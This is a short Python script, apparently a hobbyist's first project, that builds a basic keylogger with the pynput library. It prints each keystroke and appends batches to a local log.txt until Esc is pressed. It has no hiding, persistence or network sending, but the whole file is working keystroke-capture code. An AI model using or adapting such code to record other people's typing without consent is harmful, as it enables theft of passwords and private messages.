# Project: Keylogger code
# Author: Tuomas Lintula
# Version: 
# 1, 18.12.2022: I installed the Python extensions on the Visual Studio. Began the Keylogger project.
# Had to do --> pip install pynput
# Finished the project and committed it to GitHub.

import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []

# Prints the pressed keys
def on_press(key):
    global keys, count
    keys.append(key)
    count+=1
    print("{0} pressed".format(key))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


# Write to a file
def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)


# Events after the key is lifted
def on_release(key):
    if key == Key.esc:
        return False


# This is the keyboard event listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()